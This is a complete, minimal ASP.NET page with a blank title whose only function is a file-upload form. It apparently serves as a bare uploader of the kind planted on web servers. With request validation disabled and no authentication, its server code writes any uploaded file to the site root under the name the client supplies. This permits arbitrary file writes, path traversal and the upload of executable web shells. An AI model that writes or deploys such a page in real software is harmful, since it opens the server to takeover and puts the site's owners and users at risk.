<%@ Page Language="C#" Debug="true" Trace="false" ValidateRequest="false" %>

<!DOCTYPE html  >
<html>
<head>
    <title></title>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            if (f.HasFile)
            {
                 f.SaveAs(Server.MapPath("~/"+f.PostedFile.FileName));
            }             
        }
    </script>
</head>
<body>
    <form runat="server">
        <div>
           <asp:FileUpload ID="f" runat="server" />  <input type="submit" />
        </div>       
    </form>
</body>
</html>

